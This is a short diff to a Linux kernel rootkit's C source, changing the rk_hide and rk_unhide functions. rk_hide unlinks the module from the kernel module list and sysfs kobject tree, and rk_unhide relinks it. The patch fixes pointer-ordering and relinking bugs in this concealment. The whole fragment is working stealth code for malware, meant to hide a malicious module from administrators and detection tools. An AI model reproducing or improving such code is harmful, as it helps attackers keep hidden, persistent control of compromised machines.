@@ -167,9 +167,11 @@ void
 rk_hide(void)
 {
 	if (hidden) return;
+	
 	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
 	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+	
+	list_del(&THIS_MODULE->list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 
@@ -181,10 +183,11 @@ rk_unhide(void)
 {
 	int _;
 	if (!hidden) return;
+	
 	list_add(&THIS_MODULE->list, module_previous);
 	_ = kobject_add(&THIS_MODULE->mkobj.kobj,
 			THIS_MODULE->mkobj.kobj.parent, RK_NAME);
-	list_add(&THIS_MODULE->mkobj.kobj.entry, module_previous);
+	list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
 
 	hidden = 0;
 }
